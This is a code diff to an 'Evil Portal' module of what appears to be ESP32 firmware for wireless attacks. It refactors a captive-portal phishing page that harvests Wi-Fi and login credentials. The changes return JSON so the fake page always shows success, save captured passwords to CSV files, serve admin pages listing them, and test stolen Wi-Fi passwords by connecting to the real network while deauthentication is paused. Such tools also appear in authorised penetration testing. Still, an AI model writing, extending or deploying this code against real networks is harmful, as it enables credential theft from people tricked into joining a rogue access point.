+        csvLine += key + ": " + val;
+        lastCred += key.substring(0, 4) + ": " + val + "\n";
     }
 
     htmlResponse += "</li>\n";
 
+    // Update persistent display string — keep last 5 lines max
+    lastCredDisplay = lastCred;
+
     if (_verifyPwd && passwordValue != "") {
-        request->send(200, "text/html", wifiLoadPage());
+        // For verify mode: attempt connection — return 200 or 403 JSON
+        // so the fetch() in the page can show the right message
         bool isCorrect = verifyCreds(apName, passwordValue);
         if (isCorrect) {
-            lastCred += "valid: true\nStopping server...";
+            lastCred += "valid: true\n";
             saveToCSV(csvLine + ", valid: true", true);
-            printDeauthStatus();
-            if (bruceConfig.getWifiPassword(apName) != "") {
+            if (bruceConfig.getWifiPassword(apName) != "")
                 bruceConfig.addWifiCredential(apName, passwordValue);
-            }
             vTaskDelay(50 / portTICK_PERIOD_MS);
-            verifyPass = true;
-            _deauth = false;
+            verifyPass  = true;
+            _deauth     = false;
+            // 200 → fetch() shows success message
+            request->send(200, "application/json", "{\"ok\":true}");
         } else {
-            lastCred += "valid: false";
+            lastCred += "valid: false\n";
             saveToCSV(csvLine + ", valid: false", true);
-            portalController(request);
+            // 403 → fetch() shows error message
+            request->send(403, "application/json", "{\"ok\":false}");
         }
     } else {
         saveToCSV(csvLine);
-        request->send(200, "text/html", wifiLoadPage());
+        // Always 200 for non-verify mode — the phishing page shows success
+        request->send(200, "application/json", "{\"ok\":true}");
     }
 
     capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
     totalCapturedCredentials++;
 }
 
+// ---------------------------------------------------------------------------
+// HTML template helper
+// ---------------------------------------------------------------------------
 String EvilPortal::getHtmlTemplate(const String &body) {
-    return String(
-        "<!DOCTYPE html>"
-        "<html>"
-        "<head>"
-        "  <title>" +
-        apName +
-        "</title>"
-        "  <meta charset='UTF-8'>"
-        "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
-        "  <style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: "
-        "center;justify-content: center;background-color: #FFFFFF;}input[type='text'], "
-        "input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: "
-        "border-box;border: "
-        "1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: "
-        "700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: "
-        "center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: "
-        "100px;}.company-name{font-size: 42px;color: black;margin-left: 0px;}.form-container{background: "
-        "#FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px "
-        "rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: "
-        "20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: "
-        "4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: "
-        "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
-        "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
-        "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
-        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: "
-        "#202124;font-size: "
-        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px "
-        "0px "
-        "30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media "
-        "screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style>"
-        "</head>"
-        "<body>"
-        "  <div class='container'>"
-        "    <div class='logo-container'>"
-        "      <?xml version='1.0' standalone='no'?>"
-        "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' "
-        "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
-        "    </div>"
-        "    <div class=form-container>"
-        "      <div style='min-height: 150px'>" +
+    return "<!DOCTYPE html><html><head><title>" + apName + "</title>"
+        "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
+        "<style>body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:0}"
+        "input[type=text],input[type=password]{width:100%;padding:12px 10px;margin:8px 0;"
+        "box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
+        ".container{margin:auto;padding:20px;max-width:480px}"
+        ".form-container{background:#fff;border:1px solid #CEC0DE;border-radius:4px;padding:20px;"
+        "box-shadow:0 0 10px rgba(108,66,156,.2)}"
+        ".input-field{width:100%;padding:12px;border:1px solid #BEABD3;border-radius:4px;"
+        "margin-bottom:20px;font-size:14px;box-sizing:border-box}"
+        ".submit-btn{background:#0b57d0;color:#fff;border:none;padding:12px 20px;"
+        "border-radius:4px;font-size:.875rem;cursor:pointer}"
+        ".submit-btn:hover{background:#0e4eb3}"
+        ".forgot-btn{background:transparent;color:#0b57d0;border:none;font-size:14px;cursor:pointer}"
+        "</style></head><body><div class='container'><div class='form-container'>" +
         body +
-        "      </div>"
-        "    </div>"
-        "  </div>"
-        "</body>"
-        "</html>"
-    );
+        "</div></div></body></html>";
 }
 
+// ---------------------------------------------------------------------------
+// Admin endpoint pages
+// ---------------------------------------------------------------------------
 String EvilPortal::creds_GET() {
     return getHtmlTemplate(
         "<ol>" + capturedCredentialsHtml +
-        "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a "
-        "style=\"color:blue\" "
-        "href=/clear>Clear passwords</a></p></center>"
+        "</ol><br><center><a style='color:blue' href='/'>Back</a> &nbsp; "
+        "<a style='color:blue' href='/clear'>Clear</a></center>"
     );
 }
 
 String EvilPortal::ssid_GET() {
     return getHtmlTemplate(
-        "<p>Set a new SSID for Evil Portal:</p><form action='" +
-        bruceConfig.evilPortalEndpoints.setSsidEndpoint +
-        "' id='login-form'><input name='ssid' "
-        "class='input-field' type='text' placeholder='" +
-        apName + "' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>"
+        "<p>Set a new SSID:</p>"
+        "<form action='" + bruceConfig.evilPortalEndpoints.setSsidEndpoint + "'>"
+        "<input name='ssid' class='input-field' type='text' placeholder='" + apName + "' required>"
+        "<button class='submit-btn' type='submit'>Apply</button></form>"
     );
 }
 
 String EvilPortal::ssid_POST() {
     return getHtmlTemplate(
-        "Evil Portal shutting down and restarting with SSID <b>" + apName + "</b>. Please reconnect."
+        "Restarting with SSID <b>" + apName + "</b>. Please reconnect."
     );
 }
 
+// ---------------------------------------------------------------------------
+// saveToCSV()
+// ---------------------------------------------------------------------------
 void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
     FS *fs;
-    if (!getFsStorage(fs)) {
-        log_i("Error getting FS storage");
-        return;
-    }
-
+    if (!getFsStorage(fs)) { log_i("Error getting FS"); return; }
     if (!fs->exists("/BruceEvilCreds")) fs->mkdir("/BruceEvilCreds");
 
     File file;
-
-    if (!isAPname) {
+    if (!isAPname)
         file = fs->open("/BruceEvilCreds/" + outputFile, FILE_APPEND);
-    } else {
+    else
         file = fs->open("/BruceEvilCreds/" + apName + "_creds.csv", FILE_APPEND);
-    }
 
-    if (!file) {
-        log_i("Error to open file");
-        return;
-    }
+    if (!file) { log_i("Error opening file"); return; }
     file.println(csvLine);
     file.close();
     log_i("data saved");
 }
 
+// ---------------------------------------------------------------------------
+// apName_from_keyboard()
+// ---------------------------------------------------------------------------
 void EvilPortal::apName_from_keyboard() {
     apName = keyboard("Free Wifi", 30, "Evil Portal SSID:");
     if (apName == "\x1B") apName = "Free Wifi";
 }
 
+// ---------------------------------------------------------------------------
+// verifyCreds() — attempts actual WPA connection to verify password
+// ---------------------------------------------------------------------------
 bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
     bool isConnected = false;
-    bool temp = _deauth;
+    bool savedDeauth = _deauth;
     _deauth = false;
     WiFi.begin(Ssid, Password);
 
-    int i = 1;
-    while (!WiFi.isConnected()) {
-        if (i > 12) break;
+    for (int i = 0; i < 12 && !WiFi.isConnected(); i++)
         vTaskDelay(500 / portTICK_PERIOD_MS);
-        i++;
-    }
 
-    if (WiFi.isConnected()) { isConnected = true; }
+    if (WiFi.isConnected()) isConnected = true;
 
     WiFi.disconnect(false);
-    _deauth = temp;
+    _deauth = savedDeauth;
     return isConnected;
 }
